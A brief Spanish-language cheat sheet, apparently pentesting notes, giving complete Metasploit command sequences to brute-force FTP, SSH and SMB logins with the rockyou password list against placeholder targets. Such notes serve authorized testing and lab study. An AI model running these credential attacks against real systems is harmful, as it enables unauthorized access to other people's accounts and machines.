# Fuerza Bruta con Metasploit

Metasploit incluye modulos de fuerza bruta para varios protocolos.

## FTP

```bash
msfconsole

search ftp_login
use 0
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP_objetivo>
run
```

## SSH

```bash
msfconsole

search ssh_login
use 0
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP_objetivo>
run
```

## SMB

```bash
msfconsole

use auxiliary/scanner/smb/smb_login
show options
set RHOSTS <IP_objetivo>
set VERBOSE false
set SMBUser <usuario>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

> Poner `VERBOSE false` para que no se relentice mostrando cada intento fallido.
